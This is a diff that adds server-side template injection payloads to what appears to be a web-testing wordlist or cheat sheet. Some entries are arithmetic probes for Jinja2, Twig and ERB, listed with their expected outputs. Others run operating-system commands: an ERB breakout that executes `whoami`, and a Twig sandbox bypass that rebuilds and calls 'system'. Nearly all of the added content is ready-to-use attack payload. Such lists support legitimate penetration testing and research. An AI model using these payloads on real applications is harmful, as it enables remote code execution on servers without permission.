@@ -13,3 +13,27 @@ ${
 <%
 <%=
 %>
+
+
+Jinja2 (Python)
+{{7*7}}
+{{7*'7'}}
+49
+7777777
+Twig (PHP)
+{{7*7}}
+{{7*'7'}}
+49
+49
+ERB (Ruby)
+<%= 7*7 %>
+49
+%><%=`whoami`
+Template injection in sandboxed environments
+Twig's
+{%block X%}whoamiINTIGRITIsystem{%endblock%}{%set y=block('X')|split('INTIGRITI')%}{{[y|first]|map(y|last)|join}}
+{%block X%}
+whoamiINTIGRITIsystem
+{%endblock%}
+{%set y=block('X')|split('INTIGRITI')%}
+{{[y|first]|map(y|last)|join}}
